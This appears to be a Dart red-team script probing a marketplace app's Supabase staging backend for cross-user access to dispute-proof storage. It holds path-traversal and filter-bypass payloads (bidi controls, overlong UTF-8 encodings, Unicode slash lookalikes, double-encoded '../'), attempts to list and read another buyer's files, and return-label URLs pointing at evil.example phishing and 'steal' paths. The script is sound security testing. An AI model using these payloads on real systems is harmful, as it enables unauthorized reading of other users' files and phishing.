/// RED TEAM CEGO CC — pass 2. Staging only. Não corrige.
/// Lente CC3 provas · CC7 storage alheio.
/// Novas: bidi · %c1%9c · slashes unicode ≠ ／ · overlong 3-byte · label wrap.
/// Exactos BW/BQ (NÃO contar): ／ no path · reply ?/# wrap.
import 'dart:convert';
import '_rtcc.dart';

const pngBytes = <int>[
  0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D,
  0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
  0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53, 0xDE, 0x00, 0x00, 0x00,
  0x0C, 0x49, 0x44, 0x41, 0x54, 0x08, 0xD7, 0x63, 0xF8, 0xCF, 0xC0, 0x00,
  0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x05, 0xFE, 0xD4, 0xEF, 0x00, 0x00,
  0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82,
];

String storageSign(String buyer, String oid, String file) =>
    'https://fxdknzrqjenzqcvnwqqq.supabase.co/storage/v1/object/sign/fleaber_private/'
    'order_disputes/$buyer/$oid/$file';

Future<void> main() async {
  final c = Rtcc.fromEnv(loadEnv());
  await c.loginActors();
  await c.ensureBuyer2();

  Future<({String oid, String pid, String? pi})> ready() async {
    final paid = await c.payToPago(lens: 'CC3', initialQty: 1);
    if (paid == null) throw StateError('pay');
    if (!await c.toEnviado(paid.oid)) throw StateError('env');
    if (!await c.toConcluido(paid.oid)) throw StateError('conc');
    return paid;
  }

  final base = await ready();
  final minePath = c.disputeObj(c.buyerId!, base.oid, 'ok.png');
  await c.storageUpload(objectName: minePath, bytes: pngBytes, jwt: c.buyerJwt);
  final signed = await c.signObject(minePath, jwt: c.buyerJwt);
  c.note('CC3.signed', 'signed own proof', {'signed': signed, 'path': minePath},
      lens: 'CC3');

  final alienKey =
      'order_disputes/${c.buyer2Id}/00000000-0000-0000-0000-00000000c2c2/rtcc-secret.png';
  final alienUpload = await c.storageUpload(
    objectName: alienKey,
    bytes: pngBytes,
    jwt: c.buyer2Jwt,
  );
  c.note('CC3.alien_upload', 'B2 secret object', alienUpload.brief, lens: 'CC3');

  final listAlienAsB1 = await c.storageList(
    prefix: 'order_disputes/${c.buyer2Id}/',
    jwt: c.buyerJwt,
  );
  final listAlienAsS1 = await c.storageList(
    prefix: 'order_disputes/${c.buyer2Id}/',
    jwt: c.sellerJwt,
  );
  c.note('CC7.list_b2_as_b1', 'B1 lista prefixo B2', listAlienAsB1.brief,
      lens: 'CC7');
  c.note('CC7.list_b2_as_s1', 'S1 lista prefixo B2', listAlienAsS1.brief,
      lens: 'CC7');
  final listedB1 = listAlienAsB1.body.trim();
  if (listAlienAsB1.ok &&
      listedB1.isNotEmpty &&
      listedB1 != '[]' &&
      listedB1.toLowerCase().contains('rtcc-secret')) {
    c.hold(
      id: 'CC7.storage_list_alien_prefix',
      lens: 'CC7',
      severity: 'P1',
      title: 'B1 lista objectos de disputa B2',
      actor: 'buyer JWT',
      pre: 'prefix order_disputes/{B2}/',
      repro: 'POST /storage/v1/object/list/fleaber_private',
      expected: '[] / 403',
      obtained: listAlienAsB1.brief,
    );
  } else {
    c.block('CC7.storage_list_alien_prefix', 'CC7', 'list prefixo B2 vazio/403',
        listAlienAsB1);
  }

  final getAlien = await c.storageGet(alienKey, jwt: c.buyerJwt);
  if (getAlien.ok && getAlien.body.contains('PNG')) {
    c.hold(
      id: 'CC7.storage_get_alien',
      lens: 'CC7',
      severity: 'P1',
      title: 'B1 GET objecto de prova B2',
      actor: 'buyer JWT',
      pre: alienKey,
      repro: 'GET object/authenticated/fleaber_private/$alienKey',
      expected: '403 / NoSuchKey',
      obtained: getAlien.brief,
    );
  } else {
    c.block('CC7.storage_get_alien', 'CC7', 'GET alheio recusado', getAlien);
  }

  final clean = await c.insertDispute(orderId: base.oid);
  final did = clean.firstId;
  if (!clean.ok || did == null) {
    c.skip('CC3.clean_dispute', 'CC3', 'INSERT limpo falhou', clean);
    await c.dumpAll('pass2.json');
    return;
  }
  c.note('CC3.clean', 'disputa limpa para replies', {'did': did, 'oid': base.oid},
      lens: 'CC3');

  String needleFile(String oid) => storageSign(c.buyerId!, oid, 'ok.png');

  final probes = <Map<String, Object?>>[
    {
      'id': 'CC3.bidi_rlo_path',
      'title': 'proof path com RLO U+202E + prefixo B2',
      'sep': '\u202E',
      'count': true,
      'severity': 'P2',
    },
    {
      'id': 'CC3.bidi_lro_path',
      'title': 'proof path com LRO U+202D + prefixo B2',
      'sep': '\u202D',
      'count': true,
      'severity': 'P2',
    },
    {
      'id': 'CC3.bidi_rli_path',
      'title': 'proof path com RLI U+2067 + prefixo B2',
      'sep': '\u2067',
      'count': true,
      'severity': 'P2',
    },
    {
      'id': 'CC3.bidi_lrm_path',
      'title': 'proof path com LRM U+200E no meio do path',
      'sep': '\u200E',
      'count': true,
      'severity': 'P2',
    },
    {
      'id': 'CC3.c1_9c_backslash',
      'title': 'proof path overlong %c1%9c (backslash UTF-8) + prefixo B2',
      'sep': '%c1%9c',
      'count': true,
      'severity': 'P1',
    },
    {
      'id': 'CC3.e0_80_af_overlong_slash',
      'title': 'proof path overlong 3-byte %e0%80%af (/) + prefixo B2',
      'sep': '%e0%80%af',
      'count': true,
      'severity': 'P1',
    },
    {
      'id': 'CC3.div_slash_u2215',
      'title': 'proof path DIVISION SLASH U+2215 + prefixo B2',
      'sep': '\u2215',
      'count': true,
      'severity': 'P2',
    },
    {
      'id': 'CC3.frac_slash_u2044',
      'title': 'proof path FRACTION SLASH U+2044 + prefixo B2',
      'sep': '\u2044',
      'count': true,
      'severity': 'P2',
    },
    {
      'id': 'CC3.big_solidus_u29f8',
      'title': 'proof path BIG SOLIDUS U+29F8 + prefixo B2',
      'sep': '\u29F8',
      'count': true,
      'severity': 'P2',
    },
    {
      'id': 'CC3.fw_backslash_uff3c',
      'title': 'proof path FULLWIDTH REVERSE SOLIDUS U+FF3C + prefixo B2',
      'sep': '\uFF3C',
      'count': true,
      'severity': 'P2',
    },
    {
      'id': 'CC3.pct5c_backslash',
      'title': 'proof path %5c backslash + prefixo B2',
      'sep': '%5c',
      'count': true,
      'severity': 'P2',
    },
    {
      'id': 'CC3.dotleader_u2024',
      'title': 'proof path ONE DOT LEADER U+2024×2 (․․) como travessia',
      'sep': '\u2024\u2024/',
      'count': true,
      'severity': 'P1',
      'mode': 'dots',
    },
    {
      'id': 'CC3.double_encode_dotdot',
      'title': 'proof path %252e%252e%252f (double-encode ../)',
      'sep': '%252e%252e%252f',
      'count': true,
      'severity': 'P1',
    },
    {
      'id': 'exacto.BW.fullwidth_slash',
      'title': 'EXACTO BW ／ no path (NÃO contar)',
      'sep': '\uFF0F',
      'count': false,
      'severity': 'P2',
    },
    {
      'id': 'exacto.BRBW.c0af',
      'title': 'EXACTO BRBW %c0%af overlong / (NÃO contar)',
      'sep': '%c0%af',
      'count': false,
      'severity': 'P2',
    },
  ];

  Future<void> lootOracle(String id, String stored) async {
    final getStored = await c.req('GET', stored, jwt: c.buyerJwt);
    final stripped = stored
        .replaceAll('\u202E', '')
        .replaceAll('\u202D', '')
        .replaceAll('\u2067', '')
        .replaceAll('\u2066', '')
        .replaceAll('\u200E', '')
        .replaceAll('\u200F', '')
        .replaceAll('\u202C', '')
        .replaceAll('\u2069', '');
    final nfkc = stored
        .replaceAll('\uFF0F', '/')
        .replaceAll('\u2215', '/')
        .replaceAll('\u2044', '/')
        .replaceAll('\u29F8', '/')
        .replaceAll('\uFF3C', r'\')
        .replaceAll('%c1%9c', r'\')
        .replaceAll('%C1%9C', r'\')
        .replaceAll('%e0%80%af', '/')
        .replaceAll('%c0%af', '/')
        .replaceAll('%5c', r'\')
        .replaceAll('%252e', '.')
        .replaceAll('%252f', '/');
    final getStrip = stripped == stored
        ? null
        : await c.req('GET', stripped, jwt: c.buyerJwt);
    final getNfkc =
        nfkc == stored ? null : await c.req('GET', nfkc, jwt: c.buyerJwt);
    final getAlienB1 = await c.storageGet(alienKey, jwt: c.buyerJwt);
    c.note('$id.loot', 'oráculo loot', {
      'stored_get': getStored.brief,
      'strip_get': getStrip?.brief,
      'nfkc_get': getNfkc?.brief,
      'alien_get': getAlienB1.brief,
    }, lens: 'CC3');
    final loot = [
      getStored,
      getStrip,
      getNfkc,
      getAlienB1,
    ].whereType<HttpHit>().any((h) => h.ok && h.body.contains('PNG'));
    if (loot) {
      c.hold(
        id: '$id.loot_read',
        lens: 'CC3',
        severity: 'P1',
        title: 'Leitura de prova B2 via URL persistido ($id)',
        actor: 'buyer JWT',
        pre: stored,
        repro: 'GET stored/NFKC/stripped/alien',
        expected: 'sem bytes PNG alheios',
        obtained: {
          'stored': getStored.brief,
          'nfkc': getNfkc?.brief,
          'alien': getAlienB1.brief,
        },
      );
    }
  }

  for (final p in probes) {
    final id = p['id'] as String;
    final title = p['title'] as String;
    final sep = p['sep'] as String;
    final count = p['count'] as bool;
    final severity = p['severity'] as String;
    final mode = p['mode'] as String? ?? 'sep';
    final url = mode == 'dots'
        ? '${needleFile(base.oid)}$sep$sep$alienKey'
        : '${needleFile(base.oid)}$sep$alienKey';
    final reply = await c.insertReply(
      disputeId: did,
      photos: [url],
      message: 'RTCC $id',
    );
    final stored = jsonEncode(reply.map?['proof_photos'] ?? []);
    final persisted = reply.ok && stored.contains(sep);
    c.note(id, title, {
      'hit': reply.brief,
      'photos': reply.map?['proof_photos'],
    }, lens: 'CC3');
    if (!count) {
      c.note('exacto.$id', title, {
        'hit': reply.brief,
        'persisted': persisted,
      }, lens: 'CC3');
      continue;
    }
    if (persisted) {
      c.hold(
        id: id,
        lens: 'CC3',
        severity: severity,
        title: title,
        actor: 'buyer JWT',
        pre: 'reply disputa $did order ${base.oid}',
        repro: 'POST order_dispute_replies proof_photos=[prefix+sep+B2]',
        expected: 'dispute_proof_url_denied',
        obtained: {
          'hit': reply.brief,
          'photos': reply.map?['proof_photos'],
        },
      );
      final photos = reply.map?['proof_photos'];
      if (photos is List && photos.isNotEmpty) {
        await lootOracle(id, '${photos.first}');
      }
    } else {
      c.block(id, 'CC3', title, reply);
    }
  }

  // Query/fragment wrap — exacto BQ, não contar
  final qWrap = await c.insertReply(
    disputeId: did,
    photos: [
      '${needleFile(base.oid)}?x=1&u=$alienKey',
    ],
    message: 'RTCC exacto query',
  );
  c.note('exacto.BQ.query_wrap', 'needle B2 depois de ? (NÃO contar)',
      qWrap.brief,
      lens: 'CC3');
  final hWrap = await c.insertReply(
    disputeId: did,
    photos: [
      '${needleFile(base.oid)}#$alienKey',
    ],
    message: 'RTCC exacto hash',
  );
  c.note('exacto.BQ.hash_wrap', 'needle B2 depois de # (NÃO contar)',
      hWrap.brief,
      lens: 'CC3');

  // INSERT disputa (não só reply) para vectores que persistiram + label wrap
  Future<void> probeInsert({
    required String id,
    required String title,
    required List<String> Function(String oid) photosOf,
    String Function(String oid)? labelOf,
    String severity = 'P2',
    bool count = true,
  }) async {
    final paid = await ready();
    final photos = photosOf(paid.oid);
    final label = labelOf?.call(paid.oid);
    final hit = await c.insertDispute(
      orderId: paid.oid,
      photos: photos,
      extra: {
        if (label != null) 'return_label_url': label,
      },
    );
    final storedPhotos = jsonEncode(hit.map?['proof_photos'] ?? []);
    final storedLabel = '${hit.map?['return_label_url']}';
    c.note(id, title, {
      'hit': hit.brief,
      'photos': hit.map?['proof_photos'],
      'label': hit.map?['return_label_url'],
      'oid': paid.oid,
    }, lens: 'CC3');
    if (!count) {
      c.note('exacto.$id', title, hit.brief, lens: 'CC3');
      return;
    }
    final photoHit = photos.isNotEmpty &&
        hit.ok &&
        photos.any((p) =>
            storedPhotos.contains(p.substring(0, p.length.clamp(0, 48))) ||
            storedPhotos.contains('\u202E') ||
            storedPhotos.contains('%c1%9c') ||
            storedPhotos.contains('\u2215') ||
            storedPhotos.contains('%e0%80%af'));
    final labelHit = label != null &&
        hit.ok &&
        storedLabel != 'null' &&
        storedLabel.contains(label.substring(0, label.length.clamp(0, 28)));
    if (photoHit || labelHit) {
      c.hold(
        id: id,
        lens: 'CC3',
        severity: severity,
        title: title,
        actor: 'buyer JWT',
        pre: 'INSERT disputa order ${paid.oid}',
        repro: photos.isEmpty
            ? 'POST return_label_url=$label'
            : 'POST proof_photos=$photos',
        expected: '23514 denied',
        obtained: {
          'hit': hit.brief,
          'photos': hit.map?['proof_photos'],
          'label': hit.map?['return_label_url'],
        },
      );
    } else {
      c.block(id, 'CC3', title, hit);
    }
  }

  await probeInsert(
    id: 'CC3.insert_bidi_rlo',
    title: 'INSERT disputa proof_photos RLO U+202E no path',
    photosOf: (oid) => ['${needleFile(oid)}\u202E$alienKey'],
    severity: 'P2',
  );
  await probeInsert(
    id: 'CC3.insert_c1_9c',
    title: 'INSERT disputa proof_photos %c1%9c no path',
    photosOf: (oid) => ['${needleFile(oid)}%c1%9c$alienKey'],
    severity: 'P1',
  );
  await probeInsert(
    id: 'CC3.insert_u2215',
    title: 'INSERT disputa proof_photos U+2215 no path',
    photosOf: (oid) => ['${needleFile(oid)}\u2215$alienKey'],
    severity: 'P2',
  );
  await probeInsert(
    id: 'CC3.insert_label_evil_needle',
    title: 'INSERT return_label_url host evil + needle no path',
    photosOf: (_) => const [],
    labelOf: (oid) =>
        'https://evil.example/order_disputes/${c.buyerId}/$oid/phish.pdf',
    severity: 'P2',
  );
  await probeInsert(
    id: 'CC3.insert_label_bidi',
    title: 'INSERT return_label_url RLO no path com needle',
    photosOf: (_) => const [],
    labelOf: (oid) =>
        '${storageSign(c.buyerId!, oid, 'lab.pdf')}\u202Ehttps://evil.example/steal',
    severity: 'P2',
  );
  await probeInsert(
    id: 'CC3.insert_label_c19c',
    title: 'INSERT return_label_url %c1%9c wrap + needle',
    photosOf: (_) => const [],
    labelOf: (oid) =>
        '${storageSign(c.buyerId!, oid, 'lab.pdf')}%c1%9chttps://evil.example/x',
    severity: 'P2',
  );
  await probeInsert(
    id: 'CC3.insert_label_app_https',
    title: 'INSERT return_label_url fleaber.app/https://evil + needle',
    photosOf: (_) => const [],
    labelOf: (oid) =>
        'https://fleaber.app/https://evil.example/order_disputes/${c.buyerId}/$oid/x',
    severity: 'P2',
  );

  final forSeller = await ready();
  final dIns = await c.insertDispute(orderId: forSeller.oid);
  final sDid = dIns.firstId;
  if (sDid != null) {
    final wrap =
        'https://evil.example/order_disputes/${c.buyerId}/${forSeller.oid}/s.pdf';
    final sPatch = await c.patchDispute(sDid, {'return_label_url': wrap},
        jwt: c.sellerJwt);
    final row = await c.disputeRow(sDid);
    c.note('CC3.seller_patch_label', 'seller PATCH return_label wrap', {
      'hit': sPatch.brief,
      'stored': row?['return_label_url'],
    }, lens: 'CC3');
    final stored = '${row?['return_label_url']}';
    if (sPatch.ok &&
        stored != 'null' &&
        stored.contains('evil.example')) {
      c.hold(
        id: 'CC3.seller_patch_label_evil',
        lens: 'CC3',
        severity: 'P2',
        title: 'Seller grava return_label_url wrap evil.example',
        actor: 'seller JWT',
        pre: 'disputa $sDid',
        repro: 'PATCH return_label_url=https://evil.example/…needle',
        expected: 'order_dispute_label_url_denied',
        obtained: {'hit': sPatch.brief, 'stored': stored},
      );
    } else {
      c.block('CC3.seller_patch_label_evil', 'CC3',
          'seller PATCH label wrap recusado', {
        'hit': sPatch.brief,
        'stored': stored,
      });
    }
  }

  await c.dumpAll('pass2.json');
}
